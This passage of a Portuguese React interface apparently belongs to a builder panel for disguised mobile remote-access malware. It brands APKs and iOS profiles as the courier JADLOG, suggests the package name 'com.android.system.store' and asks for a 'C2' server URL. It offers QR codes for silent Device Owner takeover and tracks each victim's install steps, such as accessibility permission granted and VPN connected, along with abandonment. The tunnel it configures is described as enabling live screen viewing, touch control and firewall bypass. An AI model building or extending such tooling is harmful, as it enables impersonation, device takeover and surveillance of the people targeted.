                              style={{ flex: 1, justifyContent: "center", fontSize: "12px", padding: "8px", gap: "6px" }}
                            >
                              <Globe size={14} style={{ color: qrMode === "web_scan" ? "#fff" : "#22c55e" }} />
                              <span>Scanner Rápido Câmera / Web</span>
                            </button>
                          </div>
                        )}

                        <div
                          style={{
                            display: "grid",
                            placeItems: "center",
                            background: "#ffffff",
                            padding: "16px",
                            borderRadius: "12px",
                            margin: "0 auto",
                            border: platform === "ios" ? "2px solid #38bdf8" : qrMode === "zero_touch" ? "2px solid #38bdf8" : "2px solid var(--crimson-neon)",
                            boxShadow: platform === "ios" ? "0 0 25px rgba(56,189,248,0.3)" : qrMode === "zero_touch" ? "0 0 25px rgba(56,189,248,0.3)" : "0 0 25px rgba(255,26,42,0.3)"
                          }}
                        >
                          <QRCodeSVG
                            value={
                              platform === "ios"
                                ? activeResult.qrPayload
                                : qrMode === "zero_touch"
                                ? (activeResult.zeroTouchQrPayload || activeResult.qrPayload)
                                : (activeResult.webInstallUrl || activeResult.qrPayload)
                            }
                            size={185}
                          />
                        </div>

                        <div
                          style={{
                            background: qrMode === "zero_touch" ? "rgba(56, 189, 248, 0.08)" : "rgba(34, 197, 94, 0.08)",
                            border: qrMode === "zero_touch" ? "1px solid rgba(56, 189, 248, 0.3)" : "1px solid rgba(34, 197, 94, 0.3)",
                            borderRadius: "8px",
                            padding: "12px",
                            fontSize: "12px",
                            color: "#cbd5e1",
                            lineHeight: "1.5"
                          }}
                        >
                          {platform === "ios" ? (
                            <>
                              <strong style={{ color: "#38bdf8" }}>📱 Instalação Apple iOS OTA (Over-The-Air):</strong>
                              <div style={{ marginTop: "4px" }}>
                                Aponte a câmera do iPhone para este QR Code para abrir o Safari, autorizar o download do perfil gerenciado e concluir a instalação em <em>Ajustes → Perfil Baixado</em>.
                              </div>
                            </>
                          ) : qrMode === "zero_touch" ? (
                            <>
                              <strong style={{ color: "#38bdf8" }}>⚡ Modo Zero-Touch 0-Click (Android Enterprise Provisioning):</strong>
                              <div style={{ marginTop: "4px" }}>
                                Toque <strong>6 vezes</strong> em qualquer espaço vazio da tela <em>"Bem-vindo"</em> de um aparelho novo ou restaurado de fábrica para acionar o leitor de QR Code do Android Enterprise. Ao escanear, o Android instala silenciosamente e ativa privilégios de <strong>Device Owner (Administrador Supremo)</strong> sem qualquer clique adicional do usuário.
                              </div>
                            </>
                          ) : (
                            <>
                              <strong style={{ color: "#22c55e" }}>🌐 Modo Scanner Rápido Câmera / Navegador:</strong>
                              <div style={{ marginTop: "4px" }}>
                                Aponte a câmera comum do celular ou qualquer leitor de QR Code. Ao abrir, a página de download corporativo baixa o instalador automaticamente e inicia a esteira de rastreamento em tempo real.
                              </div>
                            </>
                          )}
                        </div>

                        <div style={{ display: "flex", gap: "10px", flexWrap: "wrap" }}>
                          {platform === "android" && qrMode === "zero_touch" ? (
                            <button
                              type="button"
                              className="secondary"
                              onClick={copyZeroTouchJson}
                              style={{ flex: 1, minWidth: "200px", justifyContent: "center", gap: "8px", padding: "10px" }}
                            >
                              {copiedZeroTouch ? <Check size={16} style={{ color: "#22c55e" }} /> : <Copy size={16} />}
                              <span>{copiedZeroTouch ? "JSON Copiado com Sucesso!" : "Copiar JSON Zero-Touch (MDM)"}</span>
                            </button>
                          ) : (
                            <button
                              type="button"
                              className="secondary"
                              onClick={copyDownloadLink}
                              style={{ flex: 1, minWidth: "200px", justifyContent: "center", gap: "8px", padding: "10px" }}
                            >
                              {copiedLink ? <Check size={16} style={{ color: "#22c55e" }} /> : <Copy size={16} />}
                              <span>{copiedLink ? "Link Copiado!" : "Copiar Link Web do Instalador"}</span>
                            </button>
                          )}

                          <button
                            type="button"
                            className="secondary"
                            onClick={() => setResultTab("tracker")}
                            style={{ justifyContent: "center", gap: "6px", padding: "10px 16px" }}
                            title="Acompanhar eventos de clique e instalação deste usuário"
                          >
                            <Activity size={16} style={{ color: "#38bdf8" }} />
                            <span>Acompanhar Instalação</span>
                          </button>
                        </div>
                      </div>
                    )}

                    {/* CONTEÚDO DA ABA 2: APK DIRETO & EMULADOR */}
                    {resultTab === "apk" && (
                      <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
                        <div style={{ display: "flex", gap: "10px", flexWrap: "wrap" }}>
                          {platform === "ios" ? (
                            <>
                              <a
                                className="primary link-button"
                                href={`${api.baseUrl}${activeResult.iosProfileUrl || activeResult.downloadUrl}`}
                                download={activeResult.apkName}
                                style={{ flex: 1, minWidth: "220px", justifyContent: "center", gap: "8px", background: "linear-gradient(135deg, #0284c7, #0369a1)" }}
                              >
                                <Download size={18} /> Baixar Perfil iOS ({activeResult.apkName})
                              </a>
                              <a
                                className="secondary link-button"
                                href={`${api.baseUrl}${activeResult.downloadUrl}`}
                                download={`${activeResult.apkName.replace(/\.mobileconfig$/, "")}-swift.zip`}
                                style={{ justifyContent: "center", gap: "6px", padding: "0 14px", textDecoration: "none", display: "inline-flex", alignItems: "center" }}
                                title="Baixar Projeto Nativo Swift / Xcode (ZIP)"
                              >
                                <Folder size={16} /> Projeto Swift
                              </a>
                            </>
                          ) : (
                            <a
                              className="primary link-button"
                              href={`${api.baseUrl}${activeResult.downloadUrl}`}
                              download={activeResult.apkName}
                              style={{ flex: 1, justifyContent: "center", gap: "8px", padding: "12px", fontSize: "14px", fontWeight: 700 }}
                            >
                              <Download size={18} /> Baixar APK ({activeResult.apkName})
                            </a>
                          )}
                          <button
                            className="secondary"
                            onClick={copyDownloadLink}
                            style={{ padding: "0 18px", display: "flex", alignItems: "center", gap: "8px" }}
                          >
                            {copiedLink ? <Check size={16} style={{ color: "#22c55e" }} /> : <Copy size={16} />}
                            <span>{copiedLink ? "Copiado!" : "Copiar Link"}</span>
                          </button>
                        </div>

                        {/* Informações de Salvamento e Verificação */}
                        <div
                          style={{
                            background: "rgba(15, 23, 42, 0.6)",
                            border: "1px solid #1e293b",
                            borderRadius: "8px",
                            padding: "12px",
                            fontSize: "12px",
                            color: "#cbd5e1"
                          }}
                        >
                          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
                            <strong>Destino de salvamento no seu computador:</strong>
                            <span style={{ fontSize: "11px", color: "#22c55e", fontWeight: 700 }}>● Pronto para Emulador</span>
                          </div>
                          <div style={{ color: "#f8fafc", fontFamily: "var(--font-mono)", fontSize: "11.5px", background: "rgba(0,0,0,0.3)", padding: "6px 10px", borderRadius: "6px" }}>
                            {platform === "ios"
                              ? `${saveDirectory}\\${activeResult.apkName}`
                              : `${saveDirectory}\\${activeResult.apkName}`}
                          </div>

                          <div style={{ marginTop: "8px", display: "flex", alignItems: "center", gap: "8px", fontSize: "11px", color: "#94a3b8" }}>
                            <span>SHA-256:</span>
                            <code style={{ fontFamily: "var(--font-mono)", color: "#38bdf8", fontSize: "10.5px" }}>
                              {activeResult.sha256 ? activeResult.sha256.slice(0, 32) + "..." : "e3b0c442..."}
                            </code>
                          </div>
                        </div>

                        {/* BLOCO DE COMANDO RÁPIDO PARA EMULADOR ADB */}
                        {platform === "android" && (
                          <div
                            style={{
                              background: "rgba(30, 41, 59, 0.5)",
                              border: "1px solid rgba(56, 189, 248, 0.3)",
                              borderRadius: "8px",
                              padding: "12px",
                              fontSize: "12px"
                            }}
                          >
                            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "8px" }}>
                              <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                                <Terminal size={15} style={{ color: "#38bdf8" }} />
                                <strong style={{ color: "#f8fafc" }}>Instalação Direta no Emulador via ADB:</strong>
                              </div>
                              <button
                                type="button"
                                className="secondary"
                                onClick={copyAdbCommand}
                                style={{ padding: "4px 10px", fontSize: "11px", gap: "4px" }}
                              >
                                {copiedAdb ? <Check size={13} style={{ color: "#22c55e" }} /> : <Copy size={13} />}
                                <span>{copiedAdb ? "Copiado!" : "Copiar ADB"}</span>
                              </button>
                            </div>
                            <div style={{
                              background: "#050811",
                              padding: "8px 12px",
                              borderRadius: "6px",
                              border: "1px solid #1e293b",
                              fontFamily: "var(--font-mono)",
                              color: "#38bdf8",
                              fontSize: "11px",
                              wordBreak: "break-all"
                            }}>
                              adb install -r "{saveDirectory}\{activeResult.apkName}"
                            </div>
                            <small style={{ display: "block", marginTop: "6px", color: "#94a3b8", fontSize: "10.5px" }}>
                              Execute no terminal do Windows para instalar diretamente no emulador Android ou celular conectado via USB.
                            </small>
                          </div>
                        )}
                      </div>
                    )}

                    {/* CONTEÚDO DA ABA 3: RASTREAMENTO DA INSTALAÇÃO (TRACKER) */}
                    {resultTab === "tracker" && (
                      <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
                        {/* CARD DE STATUS ATUAL DO USUÁRIO */}
                        <div
                          style={{
                            background: trackedSession?.isStalled
                              ? "rgba(239, 68, 68, 0.12)"
                              : trackedSession?.status === "completed"
                              ? "rgba(34, 197, 94, 0.12)"
                              : trackedSession?.status === "in_progress"
                              ? "rgba(56, 189, 248, 0.12)"
                              : "rgba(15, 23, 42, 0.6)",
                            border: trackedSession?.isStalled
                              ? "1px solid rgba(239, 68, 68, 0.4)"
                              : trackedSession?.status === "completed"
                              ? "1px solid rgba(34, 197, 94, 0.4)"
                              : trackedSession?.status === "in_progress"
                              ? "1px solid rgba(56, 189, 248, 0.4)"
                              : "1px solid #1e293b",
                            borderRadius: "10px",
                            padding: "14px"
                          }}
                        >
                          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "8px" }}>
                            <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                              <Activity size={18} style={{
                                color: trackedSession?.isStalled ? "#ef4444" : trackedSession?.status === "completed" ? "#22c55e" : "#38bdf8"
                              }} />
                              <strong style={{ fontSize: "14px", color: "#f8fafc" }}>
                                {trackedSession?.isStalled
                                  ? "⚠️ Usuário Parou a Instalação"
                                  : trackedSession?.status === "completed"
                                  ? "✅ Instalação Concluída com Sucesso!"
                                  : trackedSession?.status === "in_progress"
                                  ? "⚡ Usuário Instalando no Momento..."
                                  : "⏳ Aguardando Início pelo Usuário"}
                              </strong>
                            </div>
                            <span style={{
                              fontSize: "10.5px",
                              fontWeight: 700,
                              padding: "3px 8px",
                              borderRadius: "12px",
                              background: trackedSession?.isStalled ? "#ef4444" : trackedSession?.status === "completed" ? "#22c55e" : "#38bdf8",
                              color: "#fff"
                            }}>
                              {trackedSession?.isStalled ? "INTERROMPIDO" : trackedSession?.status === "completed" ? "CONCLUÍDO" : trackedSession?.status === "in_progress" ? "AO VIVO" : "PENDENTE"}
                            </span>
                          </div>

                          <div style={{ fontSize: "12px", color: "#cbd5e1", lineHeight: "1.5" }}>
                            {trackedSession?.isStalled ? (
                              <p style={{ margin: "4px 0", color: "#fca5a5" }}>
                                <strong>Atenção:</strong> O usuário interrompeu o fluxo na etapa: <strong>{trackedSession.stalledAtStep || trackedSession.currentStep}</strong> ({Math.round(trackedSession.elapsedSeconds || 0)}s sem interagir).
                              </p>
                            ) : trackedSession?.status === "completed" ? (
                              <p style={{ margin: "4px 0", color: "#86efac" }}>
                                O dispositivo passou por todas as etapas de onboarding, ativou o serviço e conectou ao servidor central!
                              </p>
                            ) : trackedSession?.status === "in_progress" ? (
                              <p style={{ margin: "4px 0", color: "#7dd3fc" }}>
                                O usuário está interagindo na tela: <strong>{trackedSession.currentStep}</strong> ({Math.round(trackedSession.elapsedSeconds || 0)}s decorridos).
                              </p>
                            ) : (
                              <p style={{ margin: "4px 0", color: "#94a3b8" }}>
                                O instalador está aguardando o usuário escanear o QR Code ou clicar no link de download para iniciar a detecção dos passos.
                              </p>
                            )}
                          </div>

                          <div style={{ marginTop: "10px", display: "flex", gap: "16px", fontSize: "11px", color: "#94a3b8", borderTop: "1px solid rgba(255,255,255,0.06)", paddingTop: "8px" }}>
                            <span>Sessão: <code style={{ color: "#f8fafc" }}>{activeResult.downloadUrl.replace(/^\/(apk|ios)\/download\//, "")}</code></span>
                            <span>Eventos Registrados: <strong style={{ color: "#f8fafc" }}>{(trackedSession?.steps || trackedSession?.history || []).length}</strong></span>
                            <span>Tempo Total: <strong style={{ color: "#f8fafc" }}>{trackedSession ? Math.round(trackedSession.elapsedSeconds || 0) + "s" : "0s"}</strong></span>
                          </div>
                        </div>

                        {/* LISTA CRONOLÓGICA DE PASSOS E CLIQUES DO USUÁRIO */}
                        <div style={{ display: "flex", flexDirection: "column", gap: "8px" }}>
                          <span style={{ fontSize: "12px", fontWeight: 700, color: "#94a3b8", textTransform: "uppercase", letterSpacing: "0.5px" }}>
                            Histórico de Cliques & Telas do Usuário:
                          </span>

                          {(() => {
                            const stepsList: InstallTrackStep[] = (trackedSession?.steps || trackedSession?.history || []) as InstallTrackStep[];
                            if (!trackedSession || stepsList.length === 0) {
                              return (
                                <div style={{ textAlign: "center", padding: "24px 16px", background: "rgba(15, 23, 42, 0.4)", borderRadius: "8px", border: "1px dashed #334155", color: "#64748b", fontSize: "12px" }}>
                                  Nenhum clique registrado ainda. A telemetria atualizará em tempo real automaticamente.
                                </div>
                              );
                            }
                            return (
                              <div style={{ display: "flex", flexDirection: "column", gap: "6px", maxHeight: "240px", overflowY: "auto" }}>
                                {stepsList.map((st: InstallTrackStep, idx: number) => {
                                  const stepLabels: Record<string, string> = {
                                    download_started: "📥 Download do Instalador Iniciado",
                                    apk_installed: "📦 Pacote APK Instalado no Aparelho",
                                    splash_viewed: "📱 Tela Splash / Boas-Vindas Carregada",
                                    loading_passed: "⏳ Processamento de Inicialização Concluído",
                                    settings_opened: "⚙️ Usuário Abriu Configurações de Acessibilidade",
                                    accessibility_clicked: "👆 Usuário Clicou no Nome do Aplicativo",
                                    accessibility_granted: "✅ Permissão de Acessibilidade Concedida",
                                    island_profile_requested: "🏝️ Requisição de Perfil Island / Work Profile",
                                    island_profile_created: "💼 Container de Trabalho Isolado Criado",
                                    vpn_authorized: "🛡️ Permissão de Conexão VPN Autorizada",
                                    vpn_connected: "🚀 Túnel VPN de Alta Performance Conectado",
                                    app_ready: "🎉 Instalação Concluída e Dispositivo Pronto!",
                                    user_abandoned: "❌ Usuário Fechou ou Cancelou o Processo"
                                  };

                                  return (
                                    <div
                                      key={idx}
                                      style={{
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "space-between",
                                        background: "rgba(15, 23, 42, 0.6)",
                                        border: "1px solid #1e293b",
                                        borderRadius: "6px",
                                        padding: "8px 12px",
                                        fontSize: "11.5px"
                                      }}
                                    >
                                      <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                                        <CheckCircle2 size={14} style={{ color: "#22c55e", flexShrink: 0 }} />
                                        <span style={{ color: "#f8fafc", fontWeight: 600 }}>
                                          {stepLabels[st.step] || st.title || st.step}
                                        </span>
                                      </div>
                                      <span style={{ color: "#64748b", fontFamily: "var(--font-mono)", fontSize: "10px" }}>
                                        {new Date(st.timestamp).toLocaleTimeString("pt-BR")}
                                      </span>
                                    </div>
                                  );
                                })}
                              </div>
                            );
                          })()}
                        </div>
                      </div>
                    )}

                    {/* BOTÕES INFERIORES */}
                    <div style={{ display: "flex", gap: "10px", marginTop: "6px" }}>
                      <button
                        type="button"
                        className="primary"
                        style={{ flex: 1, justifyContent: "center" }}
                        onClick={() => setActiveModalTab("preview")}
                      >
                        <Eye size={15} /> Ver Preview das Telas no Celular
                      </button>
                      <button
                        type="button"
                        className="secondary"
                        onClick={() => setShowModal(false)}
                      >
                        Concluir e Voltar
                      </button>
                    </div>
                  </div>
                ) : (
                  <form onSubmit={handleSaveBuild} style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
                    {/* BARRA DE PERFIS DE EMPRESA WHITE-LABEL (1-CLIQUE) */}
                    <div style={{
                      background: "rgba(15, 23, 42, 0.6)",
                      border: "1px solid rgba(56, 189, 248, 0.25)",
                      borderRadius: "12px",
                      padding: "14px 16px",
                      display: "flex",
                      flexDirection: "column",
                      gap: "10px"
                    }}>
                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: "8px" }}>
                        <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                          <Building2 size={18} style={{ color: "#38bdf8" }} />
                          <strong style={{ fontSize: "13.5px", color: "#f8fafc" }}>
                            Identidade da Empresa (White-Label Ajustável)
                          </strong>
                          <span style={{ fontSize: "10px", background: "rgba(56, 189, 248, 0.15)", color: "#38bdf8", border: "1px solid rgba(56, 189, 248, 0.3)", padding: "2px 8px", borderRadius: "10px", fontWeight: 700 }}>
                            1-CLIQUE PRESET
                          </span>
                        </div>
                        <span style={{ fontSize: "11px", color: "#94a3b8" }}>
                          Selecione o modelo da empresa para carregar telas, textos, logos e VPN automaticamente:
                        </span>
                      </div>

                      {/* Grade de Perfis White-Label */}
                      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(170px, 1fr))", gap: "8px" }}>
                        {enterpriseProfiles.map((p) => {
                          const isSelected = selectedEnterpriseId === p.id;
                          return (
                            <button
                              key={p.id}
                              type="button"
                              onClick={() => applyEnterpriseProfile(p)}
                              style={{
                                background: isSelected ? "rgba(56, 189, 248, 0.15)" : "rgba(30, 41, 59, 0.5)",
                                border: isSelected ? `2px solid ${p.accentColor}` : "1px solid #334155",
                                borderRadius: "10px",
                                padding: "10px",
                                textAlign: "left",
                                cursor: "pointer",
                                transition: "all 0.2s ease",
                                display: "flex",
                                flexDirection: "column",
                                gap: "5px"
                              }}
                            >
                              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                                <div style={{ width: "10px", height: "10px", borderRadius: "50%", background: p.accentColor, boxShadow: `0 0 8px ${p.accentColor}` }} />
                                <span style={{ fontSize: "9.5px", color: "#94a3b8", fontWeight: 700, textTransform: "uppercase" }}>
                                  {p.badge}
                                </span>
                              </div>
                              <span style={{ fontSize: "12px", fontWeight: 700, color: isSelected ? "#ffffff" : "#e2e8f0" }}>
                                {p.name}
                              </span>
                              <span style={{ fontSize: "10px", color: "#64748b" }}>
                                {p.category}
                              </span>
                            </button>
                          );
                        })}
                      </div>
                    </div>

                    {platform === "ios" ? (
                      <>
                        {/* Linha 1 iOS: Nome do Perfil e Bundle Identifier */}
                        <div style={{ display: "grid", gridTemplateColumns: "1.2fr 1fr", gap: "12px" }}>
                          <label>
                            Nome do Perfil / App iOS
                            <input
                              value={appName}
                              onChange={(e) => setAppName(e.target.value)}
                              placeholder="Ex: JADLOG Rastreio iOS"
                              required
                            />
                          </label>

                          <label>
                            Bundle Identifier (iOS)
                            <input
                              value={bundleId}
                              onChange={(e) => setBundleId(e.target.value)}
                              placeholder="com.droidview.agent.ios"
                              required
                            />
                          </label>
                        </div>

                        {/* Linha 2 iOS: Organização Emissora e URL Destino (WebClip) */}
                        <div style={{ display: "grid", gridTemplateColumns: "1.1fr 1fr", gap: "12px" }}>
                          <label>
                            Organização Emissora do Perfil (MDM)
                            <input
                              value={organizationName}
                              onChange={(e) => setOrganizationName(e.target.value)}
                              placeholder="Ex: DVIEW Enterprise Security"
                              required
                            />
                          </label>

                          <label>
                            URL de Destino do WebClip (Painel Web)
                            <div style={{ position: "relative" }}>
                              <input
                                value={redirectUrl}
                                onChange={(e) => setRedirectUrl(e.target.value)}
                                placeholder="https://jadlog.com.br/rastreamento"
                                style={{ paddingLeft: "32px" }}
                                required
                              />
                              <Globe size={15} style={{ position: "absolute", left: "10px", top: "12px", color: "#38bdf8" }} />
                            </div>
                          </label>
                        </div>

                        {/* Linha 3 iOS: Servidor Central e Pasta Local */}
                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px" }}>
                          <label>
                            URL do Servidor Central C2
                            <input
                              value={serverUrl}
                              onChange={(e) => setServerUrl(e.target.value)}
                              required
                            />
                          </label>

                          <label>
                            Pasta Local para Salvar Perfil (.mobileconfig)
                            <input
                              value={saveDirectory}
                              onChange={(e) => setSaveDirectory(e.target.value)}
                              placeholder="C:\Users\Dell\Downloads"
                            />
                          </label>
                        </div>
                      </>
                    ) : (
                      <>
                        {/* Linha 1 Android: Nome do App e Package ID */}
                        <div style={{ display: "grid", gridTemplateColumns: "1.2fr 1fr", gap: "12px" }}>
                          <label>
                            Nome do Aplicativo
                            <input
                              value={appName}
                              onChange={(e) => setAppName(e.target.value)}
                              placeholder="Ex: Entregue Jad Log"
                              required
                            />
                          </label>

                          <label>
                            Nome do Pacote (Package ID)
                            <input
                              value={packageName}
                              onChange={(e) => setPackageName(e.target.value)}
                              placeholder="com.android.system.store"
                              required
                            />
                          </label>
                        </div>

                        {/* Linha 2 Android: Versão e URL Destino */}
                        <div style={{ display: "grid", gridTemplateColumns: "140px 1fr", gap: "12px" }}>
                          <label>
                            Versão (V)
                            <input
                              value={version}
                              onChange={(e) => setVersion(e.target.value)}
                              placeholder="v1.4.8"
                              required
                            />
                          </label>

                          <label>
                            URL de Destino após Instalação (PWA/Site Web)
                            <div style={{ position: "relative" }}>
                              <input
                                value={redirectUrl}
                                onChange={(e) => setRedirectUrl(e.target.value)}
                                placeholder="https://jadlog.com.br/rastreamento"
                                style={{ paddingLeft: "32px" }}
                                required
                              />
                              <Globe size={15} style={{ position: "absolute", left: "10px", top: "12px", color: "#38bdf8" }} />
                            </div>
                          </label>
                        </div>

                        {/* Linha 3 Android: Servidor Central e Pasta Local */}
                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px" }}>
                          <label>
                            URL do Servidor Central
                            <input
                              value={serverUrl}
                              onChange={(e) => setServerUrl(e.target.value)}
                              required
                            />
                          </label>

                          <label>
                            Pasta Local para Salvar o APK
                            <input
                              value={saveDirectory}
                              onChange={(e) => setSaveDirectory(e.target.value)}
                              placeholder="C:\Users\Dell\Downloads"
                            />
                          </label>
                        </div>
                      </>
                    )}

                    {/* SEÇÃO: CONFIGURAÇÃO DE CONEXÃO VPN & TÚNEL SEGURO */}
                    <div className="apk-vpn-config-card">
                      <div
                        className="apk-vpn-toggle-row"
                        onClick={() => setVpnEnabled(!vpnEnabled)}
                      >
                        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                          <ShieldCheck size={20} style={{ color: vpnEnabled ? "#22c55e" : "#64748b" }} />
                          <div>
                            <strong style={{ fontSize: "13.5px", color: "#f8fafc", display: "block" }}>
                              Habilitar Conexão VPN & Túnel Seguro com o Servidor
                            </strong>
                            <small style={{ fontSize: "11px", color: "#94a3b8" }}>
                              Cria um túnel criptografado direto para o servidor, permitindo visualização de tela em tempo real e bypass de firewalls/NAT móvel.
                            </small>
                          </div>
                        </div>
                        <input
                          type="checkbox"
                          checked={vpnEnabled}
                          onChange={(e) => setVpnEnabled(e.target.checked)}
                          style={{ width: "18px", height: "18px", accentColor: "#22c55e", cursor: "pointer" }}
                        />
                      </div>

                      {vpnEnabled && (
                        <div style={{ padding: "0 14px 14px" }}>
                          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", margin: "8px 0 10px 0" }}>
                            <span style={{ fontSize: "12px", color: "#cbd5e1", fontWeight: 700 }}>
                              Selecione o Tipo de Túnel VPN (3 Protocolos de Alta Velocidade):
                            </span>
                            <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                              <label style={{ fontSize: "11px", color: "#94a3b8" }}>Porta:</label>
                              <input
                                type="number"
                                value={vpnPort}
                                onChange={(e) => setVpnPort(Number(e.target.value) || 8443)}
                                style={{ width: "80px", padding: "4px 8px", fontSize: "11.5px" }}
                              />
                            </div>
                          </div>

                          {/* 3 Opções de Protocolos VPN */}
                          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(210px, 1fr))", gap: "10px" }}>
                            {/* 1. TLS */}
                            <div
                              onClick={() => setVpnProtocol("TLS")}
                              style={{
                                background: vpnProtocol === "TLS" ? "rgba(56, 189, 248, 0.15)" : "rgba(30, 41, 59, 0.4)",
                                border: vpnProtocol === "TLS" ? "2px solid #38bdf8" : "1px solid #334155",
                                borderRadius: "10px",
                                padding: "12px",
                                cursor: "pointer",
                                transition: "all 0.2s ease"
                              }}
                            >
                              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
                                <strong style={{ fontSize: "12.5px", color: vpnProtocol === "TLS" ? "#38bdf8" : "#f1f5f9" }}>
                                  1. TLS Seguro
                                </strong>
                                <span style={{ fontSize: "9px", background: "#0284c7", color: "#fff", padding: "2px 6px", borderRadius: "8px", fontWeight: 700 }}>
                                  MÁXIMA SEGURANÇA
                                </span>
                              </div>
                              <p style={{ margin: 0, fontSize: "10.5px", color: "#94a3b8", lineHeight: "1.4" }}>
                                Criptografia de ponta a ponta (AES-256). Bypass transparente de firewalls restritivos e redes móveis.
                              </p>
                            </div>

                            {/* 2. UDP */}
                            <div
                              onClick={() => setVpnProtocol("UDP")}
                              style={{
                                background: vpnProtocol === "UDP" ? "rgba(34, 197, 94, 0.15)" : "rgba(30, 41, 59, 0.4)",
                                border: vpnProtocol === "UDP" ? "2px solid #22c55e" : "1px solid #334155",
                                borderRadius: "10px",
                                padding: "12px",
                                cursor: "pointer",
                                transition: "all 0.2s ease"
                              }}
                            >
                              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
                                <strong style={{ fontSize: "12.5px", color: vpnProtocol === "UDP" ? "#22c55e" : "#f1f5f9" }}>
                                  2. UDP Datagram
                                </strong>
                                <span style={{ fontSize: "9px", background: "#15803d", color: "#fff", padding: "2px 6px", borderRadius: "8px", fontWeight: 700 }}>
                                  LATÊNCIA &lt; 1MS
                                </span>
                              </div>
                              <p style={{ margin: 0, fontSize: "10.5px", color: "#94a3b8", lineHeight: "1.4" }}>
                                Transmissão Wire-Speed sem bloqueio (tipo WireGuard). Ideal para tela em tempo real e touch sem lag.
                              </p>
                            </div>

                            {/* 3. TCP */}
                            <div
                              onClick={() => setVpnProtocol("TCP")}
                              style={{
                                background: vpnProtocol === "TCP" ? "rgba(245, 158, 11, 0.15)" : "rgba(30, 41, 59, 0.4)",
                                border: vpnProtocol === "TCP" ? "2px solid #f59e0b" : "1px solid #334155",
                                borderRadius: "10px",
                                padding: "12px",
                                cursor: "pointer",
                                transition: "all 0.2s ease"
                              }}
                            >
                              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
                                <strong style={{ fontSize: "12.5px", color: vpnProtocol === "TCP" ? "#f59e0b" : "#f1f5f9" }}>
                                  3. TCP Stream
                                </strong>
                                <span style={{ fontSize: "9px", background: "#b45309", color: "#fff", padding: "2px 6px", borderRadius: "8px", fontWeight: 700 }}>
                                  1000 MBPS FORTE
                                </span>
                              </div>
                              <p style={{ margin: 0, fontSize: "10.5px", color: "#94a3b8", lineHeight: "1.4" }}>
                                Buffers 128KB, TCP_NODELAY. Máxima resiliência contra perdas de pacote em conexões celulares 4G/5G oscilantes.
                              </p>
                            </div>
                          </div>

                          {/* Destaque de Liberação Imediata */}
                          <div style={{ marginTop: "10px", padding: "8px 12px", background: "rgba(34, 197, 94, 0.08)", border: "1px solid rgba(34, 197, 94, 0.25)", borderRadius: "8px", fontSize: "11px", color: "#86efac", display: "flex", alignItems: "center", gap: "8px" }}>
                            <span>⚡</span>
                            <span><strong>Autorizou liberou:</strong> Conexão estabelecida instantaneamente no milissegundo de confirmação pelo usuário, com vazão máxima e latência mínima.</span>
                          </div>
                        </div>
                      )}
                    </div>

                    {/* SEÇÃO: CONFIGURAÇÃO DE PERFIL ISLAND / WORK PROFILE (ANDROID ENTERPRISE) */}
                    {platform === "android" && (
                      <div className="apk-vpn-config-card" style={{ marginTop: "12px", border: islandProfileEnabled ? "1px solid rgba(56, 189, 248, 0.4)" : "1px solid #1e293b" }}>
                        <div
                          className="apk-vpn-toggle-row"
                          onClick={() => setIslandProfileEnabled(!islandProfileEnabled)}
                        >
                          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                            <Boxes size={20} style={{ color: islandProfileEnabled ? "#38bdf8" : "#64748b" }} />
                            <div>
                              <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                                <strong style={{ fontSize: "13.5px", color: "#f8fafc" }}>
                                  Criar Perfil Island / Work Profile Isolado (Android Enterprise)
                                </strong>
                                <span className="apk-tag-pill active" style={{ background: "rgba(56, 189, 248, 0.15)", color: "#38bdf8", border: "1px solid rgba(56, 189, 248, 0.3)" }}>
                                  MDM CONTAINER
                                </span>
                              </div>
                              <small style={{ fontSize: "11px", color: "#94a3b8" }}>
                                Ao instalar no aparelho, solicita automaticamente a criação de um perfil de trabalho segregado (ACTION_PROVISION_MANAGED_PROFILE / Island container) para execução segura e isolada.
                              </small>
                            </div>
                          </div>
                          <input
                            type="checkbox"
                            checked={islandProfileEnabled}
                            onChange={(e) => setIslandProfileEnabled(e.target.checked)}
                            style={{ width: "18px", height: "18px", accentColor: "#38bdf8", cursor: "pointer" }}
                          />
                        </div>
                        {islandProfileEnabled && (
                          <div style={{ padding: "10px 14px 14px", borderTop: "1px solid rgba(56, 189, 248, 0.15)", background: "rgba(15, 23, 42, 0.4)", borderRadius: "0 0 10px 10px", fontSize: "11px", color: "#94a3b8", display: "flex", alignItems: "center", gap: "8px" }}>
                            <span style={{ color: "#38bdf8", fontSize: "14px" }}>🏝️</span>
                            <span>O app emitirá requisição nativa de provisionamento ao Android e ativará o container com a maleta corporativa.</span>
                          </div>
                        )}
                      </div>
                    )}

                    {/* SEÇÃO: HISTÓRICO DE IMAGENS E LOGOS SELECIONADOS */}
                    <div className="apk-logo-history-section">
                      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "8px" }}>
                        <span className="app-actions-title">
                          <ImageIcon size={13} style={{ verticalAlign: "middle", marginRight: "4px" }} />
